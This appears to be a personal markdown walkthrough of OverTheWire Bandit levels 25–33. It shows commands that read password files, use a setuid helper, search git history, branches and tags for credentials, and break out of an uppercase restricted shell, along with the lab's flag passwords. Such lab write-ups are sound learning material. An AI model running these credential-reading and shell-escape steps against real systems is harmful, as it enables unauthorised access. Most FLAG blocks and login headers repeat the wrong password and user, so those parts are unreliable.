> 	Logging in to bandit26 from bandit25 > should be 
> 	fairly easy… The shell for user bandit26 is not
>	/bin/bash, but something else. Find out what it is,
>	how it works and how to break out of it.
> ```

```bash
cat /etc/bandit_pass/bandit26
	5czgV9L3Xx8JPOyRbXh6lQbmIOWvPT6Z
```

> ## FLAG:
>```bash
>	pwd: 5czgV9L3Xx8JPOyRbXh6lQbmIOWvPT6Z
>```
> back to [Table Of Content](#TableOfContent)
_________________
_________________

~~~~~~~~~~~~~~~~~
~~~~~~~~~~~~~~~~~
_________________
_________________

# <a name="Level26"></a>Level 26 -> 27

> ```bash
> ssh bandit26@bandit.labs.overthewire.or> g -p 2220
> pwd: 5czgV9L3Xx8JPOyRbXh6lQbmIOWvPT6Z
> 
> Level Goal
> 	Good job getting a shell! Now hurry and 
> 	grab the password for bandit27!
> ```

here we are given a script which runs as a differnt user privelige.
we can use this to get the other user to read its own password for us.

```
./bandit27-do cat /etc/bandit_pass/bandit27
	3ba3118a22e93127a4ed485be72ef5ea
```

> ## FLAG:
>```bash
>	pwd: 3ba3118a22e93127a4ed485be72ef5ea
>```
> back to [Table Of Content](#TableOfContent)
_________________
_________________

~~~~~~~~~~~~~~~~~
~~~~~~~~~~~~~~~~~
_________________
_________________
# <a name="Level27"></a>Level 27 -> 28

> ```bash
> ssh bandit32@bandit.labs.overthewire.or> g -p 2220
> pwd: 56a9bf19c63d650ce78e6ec0354ee45e
> 
> Level Goal
> 	There is a git repository at
> 	ssh://bandit27-git@localhost/home/bandit27-git/repo.
> 	The password for the user bandit27-git is 
> 	the same as for the user bandit27.
> 
> 	Clone the repository and find the password 
> 	for the next level.
> ```

We have been given a git repository and told the password is somewhere in there.
lets first clone it and then check it out
```
git clone ssh://bandit27-git@localhost/home/bandit27-git/repo
	Cloning into 'repo'...
	Could not create directory '/home/bandit27/.ssh'.
	The authenticity of host 'localhost (127.0.0.1)' can't be established.
	ECDSA key fingerprint is SHA256:98UL0ZWr85496EtCRkKlo20X3OPnyPSB5tB5RPbhczc.
	Are you sure you want to continue connecting (yes/no)? yes
	Failed to add the host to the list of known hosts (/home/bandit27/.ssh/known_hosts).
	This is a OverTheWire game server. More information on http://www.overthewire.org/wargames
	
	bandit27-git@localhost's password: 
	Permission denied, please try again.
	bandit27-git@localhost's password: 
	remote: Counting objects: 3, done.
	remote: Compressing objects: 100% (2/2), done.
	remote: Total 3 (delta 0), reused 0 (delta 0)
	Receiving objects: 100% (3/3), done.
```
lets see what it created
```
ls
	repo
```
we see that we have a folder. lets navigate into it and then see what it contains.
```
cd repo
ls
	README
```
we have a README file. lets see what the content is.
```
cat README 
	The password to the next level is: 0ef186ac70e04ea33b4c1853d2526fa2
```

> ## FLAG:
>```bash
>	pwd: 0ef186ac70e04ea33b4c1853d2526fa2
>```
> back to [Table Of Content](#TableOfContent)
_________________
_________________

~~~~~~~~~~~~~~~~~
~~~~~~~~~~~~~~~~~
_________________
_________________
# <a name="Level28"></a>Level 28 -> 29

> ```bash
> ssh bandit32@bandit.labs.overthewire.or> g -p 2220
> pwd: 56a9bf19c63d650ce78e6ec0354ee45e
> 
> Level Goal
> 	There is a git repository at 
>	ssh://bandit28-git@localhost/home/bandit28-git/repo.
>	The password for the user bandit28-git is 
>	the same as for the user bandit28.
> 
> 	Clone the repository and find the password 
> 	for the next level.
> ```

We have been given a git repository and told the password is somewhere in there.
lets first clone it and then check it out.
There was nothing in the ReadMe file. lets see what the logs tell us.

we can see that there are multiple logs.

with `git checkout ` we can navigate to the required log and then read the contents of each file
```
git checkout 186a1038cc54d1358d42d468cdc8e3cc28a93fcb
	Previous HEAD position was b67405d... initial commit of README.md
	HEAD is now at 186a103... add missing data
```
lets read the content.
```
cat README.md 
	# Bandit Notes
	Some notes for level29 of bandit.

	## credentials

	- username: bandit29
	- password: bbc96594b4e001778eee9975372716b2
```

> ## FLAG:
>```bash
>	pwd: 5czgV9L3Xx8JPOyRbXh6lQbmIOWvPT6Z
>```
> back to [Table Of Content](#TableOfContent)
_________________
_________________

~~~~~~~~~~~~~~~~~
~~~~~~~~~~~~~~~~~
_________________
_________________
# <a name="Level29"></a>Level 29 -> 30

> ```bash
> ssh bandit32@bandit.labs.overthewire.or> g -p 2220
> pwd: 56a9bf19c63d650ce78e6ec0354ee45e
> 
> Level Goal
> 	There is a git repository at
> 	ssh://bandit29-git@localhost/home/bandit29-git/repo.
> 	The password for the user bandit29-git is
> 	the same as for the user bandit29.
> 
> 	Clone the repository and find the password for the next level.
> ```

We have been given a git repository and told the password is somewhere in there.
lets first clone it and then check it out.
There was nothing in the ReadMe file. 
git also lets us create branches.

with `git branch -a` we can list all of them. 
we see that there is a development branch. lets check that out.

```
git checkout origin/dev
	Previous HEAD position was 84abedc... fix username
	HEAD is now at 33ce2e9... add data needed for development
```
Lets read the content
```
cat README.md 
	# Bandit Notes
	Some notes for bandit30 of bandit.

	## credentials

	- username: bandit30
	- password: 5b90576bedb2cc04c86a9e924ce42faf
```

> ## FLAG:
>```bash
>	pwd: 5czgV9L3Xx8JPOyRbXh6lQbmIOWvPT6Z
>```
> back to [Table Of Content](#TableOfContent)
_________________
_________________

~~~~~~~~~~~~~~~~~
~~~~~~~~~~~~~~~~~
_________________
_________________
# <a name="Level30"></a>Level 30 -> 31

> ```bash
> ssh bandit32@bandit.labs.overthewire.or> g -p 2220
> pwd: 56a9bf19c63d650ce78e6ec0354ee45e
> 
> Level Goal
> 	There is a git repository at
> 	ssh://bandit30-git@localhost/home/bandit30-git/repo.
> 	The password for the user
> 	bandit30-git is the same as for 
> 	the user bandit30.
> 
> 	Clone the repository and find the
> 	password for the next level.
> ```


We have been given a git repository and told the password is somewhere in there.
lets first clone it and then check it out. Lets see what the readme file contains.

HMMMMM nothing of intetrests.
```
cat README.md 
	just an epmty file... muahaha
```
git log doesnt give us anything of interest aswell. :/ what else can we do??
```bash
git log
	commit 3aa4c239f729b07deb99a52f125893e162daac9e
	Author: Ben Dover <noone@overthewire.org>
	Date:   Tue Oct 16 14:00:44 2018 +0200

    initial commit of README.md
```
well git can also have `tags ` associated with their commits.
lets see if their are any tags. and if so then display the content
```bash
git tag -l
	secret

git show secret 
	47e603bb428404d265f59c42920d81e5
```

> ## FLAG:
>```bash
>	pwd: 5czgV9L3Xx8JPOyRbXh6lQbmIOWvPT6Z
>```
> back to [Table Of Content](#TableOfContent)
_________________
_________________

~~~~~~~~~~~~~~~~~
~~~~~~~~~~~~~~~~~
_________________
_________________
# <a name="Level31"></a>Level 31 -> 32

> ```bash
> ssh bandit32@bandit.labs.overthewire.or> g -p 2220
> pwd: 56a9bf19c63d650ce78e6ec0354ee45e
>
> Level Goal
>	There is a git repository at 
>	ssh://bandit31-git@localhost/home/	
>	bandit31-git/repo. The password for 
>	the user bandit31-git is the same as
>	for the user bandit31.
>
>	Clone the repository and find the
>	password for the next level.
> ```

for this we had to create a file called `key.txt` and give it the content `May i come in?`.

when we then push it to the branch as seen below we can get the password.

```text
git add -f key.txt  && git commit -m '...' && git  push
	[master 0a5b2b6] ...
	 1 file changed, 1 insertion(+), 1 deletion(-)
	Could not create directory '/home/bandit31/.ssh'.
	The authenticity of host 'localhost (127.0.0.1)' can't be established.
	ECDSA key fingerprint is SHA256:98UL0ZWr85496EtCRkKlo20X3OPnyPSB5tB5RPbhczc.
	Are you sure you want to continue connecting (yes/no)? yes
	Failed to add the host to the list of known hosts (/home/bandit31/.ssh/known_hosts).
	This is a OverTheWire game server. More information on http://www.overthewire.org/wargames
	
	bandit31-git@localhost's password: 
	Counting objects: 6, done.
	Delta compression using up to 4 threads.
	Compressing objects: 100% (4/4), done.
	Writing objects: 100% (6/6), 521 bytes | 0 bytes/s, done.
	Total 6 (delta 1), reused 0 (delta 0)
	remote: ### Attempting to validate files... ####
	remote: 
	remote: .oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.
	remote: 
	remote: Well done! Here is the password for the next level:
	remote: 56a9bf19c63d650ce78e6ec0354ee45e
	remote: 
	remote: .oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.
```

> ## FLAG:
>```bash
>	pwd: 5czgV9L3Xx8JPOyRbXh6lQbmIOWvPT6Z
>```
> back to [Table Of Content](#TableOfContent)
_________________
_________________

~~~~~~~~~~~~~~~~~
~~~~~~~~~~~~~~~~~
_________________
_________________
# <a name="Level32"></a>Level 32 -> 33

> ```bash
> ssh bandit32@bandit.labs.overthewire.or> g -p 2220
> pwd: 56a9bf19c63d650ce78e6ec0354ee45e
> 
> Level Goal
> 	After all this git stuff its time 
> 	for another escape. Good luck!
> ```

this was a wierd level.
Every command you type got made into UPPERCASE.

there is a way to invoke a shell.

when typing `$0` we can then type a command without having it transposed to uppercase.
this can then be enforeced with `echo $0`. after that we can get the password.

```
WELCOME TO THE UPPERCASE SHELL
>> ls
	sh: 1: LS: not found
>> $0
	$ echo $0
sh
$ cat /etc/bandit_pass/bandit33
	c9c3199ddf4121b10cf581a98d51caee
```

> ## FLAG:
>```bash
>	pwd: 5czgV9L3Xx8JPOyRbXh6lQbmIOWvPT6Z
>```
> back to [Table Of Content](#TableOfContent)
_________________
_________________

~~~~~~~~~~~~~~~~~
~~~~~~~~~~~~~~~~~
_________________
_________________

# <a name="Level33"></a>Level 33 -> 34

> ```bash
> ssh bandit32@bandit.labs.overthewire.or> g -p 2220
> pwd: 56a9bf19c63d650ce78e6ec0354ee45e
> ```

# DOES NOT EXIST YET!!!


> ## FLAG:
> back to [Table Of Content](#TableOfContent)

